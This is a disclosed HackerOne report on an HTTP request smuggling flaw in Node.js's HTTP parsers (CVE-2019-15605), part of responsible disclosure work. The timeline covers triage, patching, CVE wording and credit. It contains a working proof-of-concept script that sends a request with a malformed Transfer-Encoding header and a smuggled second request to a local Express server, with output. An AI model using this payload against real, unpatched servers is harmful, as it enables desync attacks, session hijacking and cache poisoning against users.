---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/http-request-smuggling
  - env/web
  - stack/node
substate: "resolved"
weakness: "HTTP Request Smuggling"
enriched: true
date: 2020-03-07
submitted: 2019-11-12T01:11:47.717Z
bounty_usd: null
votes: 105
cve: "CVE-2019-15605"
program: "[[programs/nodejs|Node.js]]"
reporter: "erubinson"
source: "https://hackerone.com/reports/735748"
title: "HTTP request smuggling using malformed Transfer-Encoding header"
---
# HTTP request smuggling using malformed Transfer-Encoding header

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 105 | **Program:** Node.js | **Disclosed:** 2020-03-07

- Report: [https://hackerone.com/reports/735748](https://hackerone.com/reports/735748)
- CWE: HTTP Request Smuggling | CVE: CVE-2019-15605
- Submitted: 2019-11-12T01:11:47.717Z

## Timeline

- **Report Filed**
- **2019-11-12** @erubinson: # HTTP Request Smuggling PoC

> Please see the full PDF disclosure report, attached to the message above, for context.

## Overview

I'm attaching two files for testing the HTTP smuggling vulnerability. Both do the following:

- Start up a simple Express server (which uses the http_parser library)
- Create a client and connect to the server.
- Write a single HTTP message to the wire, wait for the response, and close the connection.

Both the server and client print out the message(s) they receive.


## Running the tests

1. Install the desired Node.js version to test
2. Run `npm install` (a package-lock.json file is provided)
3. Start the test: `node <test-file>.js`
4. Check the output (see below)

## The test cases

`standard-request.js`: The 'happy path', a normal request.

- Posts "HELLOWORLD".
- Expects to get back "HELLO FROM EXPRESS!".

Output:
```
------listening
connected to express server!
SENDING DATA TO EXPRESS SERVER
EXPRESS HEADERS { 'content-type': 'text/plain; charset=utf-8',
  host: 'hacker.exploit.com',
  connection: 'keep-alive',
  'content-length': '10' }
EXPRESS_GOT_REQUEST>>>>>>>HELLOWORLD<<<<<<END_REQUEST
EXPRESS_CLIENT_GOT_RESPONSE>>>>>>>HTTP/1.1 200 OK
X-Powered-By: Express
Date: Tue, 12 Nov 2019 01:28:48 GMT
Connection: keep-alive
Content-Length: 19

HELLO FROM EXPRESS!<<<<<<<<<<END_RESPONSE
disconnected from express server
```


`smuggled-request.js`:

- Posts "HELLOWORLD" and smuggles in a second HTTP request which posts "I AM A SMUGGLED REQUEST!!!".
- Expects to get back a 400 bad request (in Node v9+) or an empty response (in Node v8 and lower) but does not. Instead, two responses are written back on the wire.
- This makes the server vulnerable to HTTP desync attacks if it sits behind a load balancer or server which handles the TE/CL headers differently (ie: correctly).

Output:
```
connected to express server!
SENDING DATA TO EXPRESS SERVER
EXPRESS HEADERS { 'content-type': 'text/plain; charset=utf-8',
  host: 'hacker.exploit.com',
  connection: 'keep-alive',
  'content-length': '10',
  'transfer-encoding': 'chunked, eee' }
EXPRESS HEADERS { 'content-type': 'text/plain; charset=utf-8',
  host: 'hacker.exploit.com',
  connection: 'keep-alive',
  'content-length': '30' }
EXPRESS_GOT_REQUEST>>>>>>>HELLOWORLD<<<<<<END_REQUEST
EXPRESS_GOT_REQUEST>>>>>>>I AM A SMUGGLED REQUEST!!!

<<<<<<END_REQUEST
EXPRESS_CLIENT_GOT_RESPONSE>>>>>>>HTTP/1.1 200 OK
X-Powered-By: Express
Date: Tue, 12 Nov 2019 01:28:13 GMT
Connection: keep-alive
Content-Length: 19

HELLO FROM EXPRESS!HTTP/1.1 200 OK
X-Powered-By: Express
Date: Tue, 12 Nov 2019 01:28:13 GMT
Connection: keep-alive
Content-Length: 19

HELLO FROM EXPRESS!<<<<<<<<<<END_RESPONSE
disconnected from express server
```
- **2019-11-13** @nochnoidozor: Hi @erubinson,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **2019-11-15** @erubinson: Hi @nochnoidozor,

Thanks for the update! Glad to hear it's been triaged and am looking forward to hearing back from the team in regards to the ruling and plan of action.

Best,
@erubinson
- **2019-11-20** @erubinson: Hi @nochnoidozor,

Hope all is well; just wanted to check-in. Do you know if the Node team has had an opportunity to review this report yet?

Regards,
@erubinson
- **2019-11-23** @nochnoidozor: Hi @erubinson,

Thank you for reaching out. Unfortunately we do not yet have an update to share. We will provide an update as soon as are able. Appreciate your continued patience.

@nochnoidozor
- **2019-11-27** @octetcloud: Please note that an earlier issue related to this was opened and closed, with specific requests about the timing of fixes: https://hackerone.com/reports/735305
- **Report Collaborator Invited**
- **Report Collaborator Joined**
- **2019-11-27** @erubinson: Hi @octetcloud,

Yes, the #735305 ticket was submitted by Kai Weingarten (@char1atan), a member of eBay's Legal council, to begin the disclosure process for this vulnerability I found. As Kai mentioned in the original ticket, our hope is that this issue is acknowledged and that we can discuss the timing of a fix given the holiday season and code-freezes/moratoriums potentially impacted companies are in.

I've added Kai to this thread so we can continue all of the discussion in one place. Looking forward to your reply.

Regards,
@erubinson
- **2019-12-03** @wa7son: Hi @erubinson 

Thank you for the very detailed vulnerability report. I too can confirm that this bug exists. I've also tested your exploit on Node.js 13 and the `llhttp` parser is unfortunately vulnerable to HTTP request smuggling as well.

You mentioned in your PDF that you already developed a patch for the `http-parser` dependency. Would you mind sharing that with us via HackerOne so that I can begin the process of getting this fixed? I'll start work on a similar patch for `llhttp` to fix this in Node.js 13+.

The timing of the release of the fix depends on how complicated it is to fix across both `llhttp` and `http-parser`, but I'll get back to you with details as I learn more ASAP.

Regards,
Thomas
- **2019-12-03** @wa7son: Hi @erubinson

I just realized that I mixed up when `llhttp` was introduced in Node.js: The new parser was already introduced in Node.js 12, so your original tests on Node.js 12 already uncovered this vulnerability with the `llhttp` parser (unless you ran Node.js with the `--http-parser=legacy` flag).

Regards,
Thomas
- **2019-12-03** @erubinson: Hi @wa7son,

Yes, you're correct. I checked again and do see that the `llhttp` was made the default parser in node v12.0.0 from the [release notes](https://github.com/nodejs/node/blob/master/doc/changelogs/CHANGELOG_V12.md#12.0.0). The `http_parser` library is still present in the `deps/` folder in the `v12.x` branch though; it was only removed in the `v13.x` branch.

I've attached the patch I created for the v2.8.0 version of the http_parser library which applies to Node.js v6.x - 11.x. This patch was created for the `v10.x` branch (being the latest LTS release using this version of http_parser), but the changes are the exact same for the others too.

@char1atan has also requested that Node and eBay could have a dialog around the timing of the disclosure & subsequent fix for this issue. Would this be possible?

Please let me know if there's anything else I can do to help.

Thanks,
Ethan
- **2019-12-23** @erubinson: Hi @wa7son, @octetcloud, and @nochnoidozor,

Just checking in to see what the current status is. Hope everyone is enjoying the holiday season!

Regards,
Ethan
- **External User Joined**
- **2020-01-16** @octetcloud: Reproduction was included in a zip file, I am reinserting here so its easier to see while reviewing the issue:
```
'use strict';

const http = require('http');
const net = require('net');
const assert = require('assert');

const REQUEST_BB = `POST / HTTP/1.1
Content-Type: text/plain; charset=utf-8
Host: hacker.exploit.com
Connection: keep-alive
Content-Length: 10
Transfer-Encoding: chunked, eee

HELLOWORLDPOST / HTTP/1.1
Content-Type: text/plain; charset=utf-8
Host: hacker.exploit.com
Connection: keep-alive
Content-Length: 30

I AM A SMUGGLED REQUEST!!!

`;

const express = require('express');

const app = express();
app.use((req, res) => {
    console.log('EXPRESS HEADERS', req.headers)
    let data = "";
    req.on('data', function(chunk) { 
        data += chunk;
    });
    req.on('end', function() {
        console.log("EXPRESS_GOT_REQUEST>>>>>>>" + data + "<<<<<<END_REQUEST");
        res.end('HELLO FROM EXPRESS!');
    });
});


const server2 = app.listen(3000, () => {
    console.log('------listening')
    const client = net.createConnection({
        port: 3000,
        host: 'localhost'
    }, () => {
        console.log('connected to express server!');
        const req = REQUEST_BB.replace(/\n/g, '\r\n');
        console.log("SENDING DATA TO EXPRESS SERVER")
        client.write(req);
        client.end();
    });
    let data = "";
    client.on('data', (chunk) => {
        data += chunk;
    });
    client.on('end', () => {
        console.log('EXPRESS_CLIENT_GOT_RESPONSE>>>>>>>' + data + "<<<<<<<<<<END_RESPONSE");
        console.log('disconnected from express server');
    });
});
```
- **Report Title Updated**
- **2020-01-16** @octetcloud: I rewrote the issue description to be more succinct and descriptive. If "HTTP request smuggling using malformed Transfer-Encoding header" is not a sufficient description, please tell me.
- **2020-01-16** @erubinson: @octetcloud The new description sounds good to me. Thanks for making it more concise. Has there been any further development on the patch for the LTS Node versions? Now that the holiday season is over, and companies are out of moratorium, it would be great to publicize and patch this as soon as possible.

Thanks,
Ethan
- **2020-01-16** @octetcloud: Can someone suggest the text to use for the CVE description? It must match this very specific format: `PROBLEM TYPE` in `PRODUCT/VERSION` causes `IMPACT` when `ATTACK`
- **2020-01-16** @erubinson: What about something like this?

**Problem Type**: `HTTP Request Smuggling` or `HTTP Request Smuggling Enabling De-Sync Attacks` 

**Product/Version**: `Node.js v6.x.x - v13.x.x` (earlier versions [0.x - 5.x] are most likely vulnerable too; not sure if we should investigate and call those out as part of this CVE). The other options is to call out the product as being `http_parser / llhttp` and name the specific versions of these libraries which are vulnerable.

**Impact when attack**: Affected Node.js versions can be exploited to perform HTTP desync attacks and deliver
malicious payloads to unsuspecting users. The payloads can be crafted by an attacker to hijack
user sessions, poison cookies, perform clickjacking, and a multitude of other attacks depending
on the architecture of the underlying system.
- **2020-01-16** @octetcloud: @erubinson wrt. the description, it must be, literally, a single sentence of that form. Perhaps

> HTTP request smuggling in Node.js 10, 12, and 13 causes malicious payload delivery when transfer-encoding is malformed

The more detailed description you above could be redacted into the report description before or during disclosure, or left where it is as a comment. I have no strong feelings.

wrt. to progress, its being worked on, we will soon announce publically that sec releases are upcoming, and the expected date of the releases
- **2020-01-16** @erubinson: Gotcha. What about this then? Changing `causes` to `allows for` and including all versions of Node using http-parser 2.8.0 & the new llhttp parser.

>HTTP request smuggling in Node.js v6.x - 13.x allows for malicious payload delivery when the Transfer-Encoding header is malformed.
- **2020-01-16** @octetcloud: "causes" is in the immutable part of the template. Sorry if that seem excessively bureaucratic or pedantic, but I'm not keen to get a CVE request rejected because I didn't follow the directions.
- **2020-01-16** @erubinson: :) haha fair enough, that sounds good to me then.
- **2020-01-22** @octetcloud: cve requested: https://hackerone.com/nodejs/cve_requests/1401/edit
- **2020-01-22** @erubinson: @octetcloud Thanks for requesting the CVE. The link you shared just takes me to a "Page Not Found". Is there a way I can get access or only after the CVE is published?
- **2020-01-22** @octetcloud: You can't get access. There is nothing in it you don't know: the sentence above, the fix versions (semver minor updates to all supported lines). That's it. CVE has not been allocated yet. Once its been allocated, I believe it will show up in the header of this report, even if it isn't disclosed (which it won't be until fix is released, progress is good, announcement is still not quite ready).
- **2020-01-22** @octetcloud: @erubinson In the release announcement I can say "Reported by ....". Would you like that? If so, pls supply a "...". Thanks!
- **2020-01-22** @erubinson: @octetcloud I'd really appreciate a shoutout in the release announcement.

Could you please say "Reported by Ethan Rubinson" or "Reported by Ethan Rubinson, a software engineer at eBay".

Not sure if it would be appropriate to link my LinkedIn. It's https://www.linkedin.com/in/ethanrubinson/ if so.
- **Report Resolved**
- **Agreed On Going Public**
- **2020-02-06** @erubinson: @octetcloud 

Thanks for the shoutout in the release announcement!

I was wondering if this issue is eligible for a Bug Bounty? The program overview says: "Only critical vulnerabilities that demonstrate complete compromise of the system's integrity or confidentiality are eligible for a bounty". I believe this accurately describes the impact of this vulnerability if exploited.
- **2020-02-20** @octetcloud: @erubinson Can you please respond to the request for disclosure? See https://github.com/nodejs/security-wg/issues/631
- **Report Became Public**
- **Bounty Awarded**
- **Bounty Awarded**
